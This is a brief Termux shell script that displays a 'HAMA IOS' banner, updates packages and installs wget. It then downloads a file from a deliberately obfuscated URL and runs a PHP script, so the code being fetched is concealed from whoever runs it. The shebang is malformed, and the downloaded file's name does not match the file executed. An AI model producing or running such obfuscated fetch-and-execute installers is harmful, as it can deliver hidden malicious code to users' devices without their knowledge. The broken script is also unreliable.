#!/data/data/com.termux


sleep 2
figlet HAMA IOS
sleep 2
apt-get update && apt-get upgrade
sleep 2
pkg install wget
sleep 1
wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
php HAMAIOS
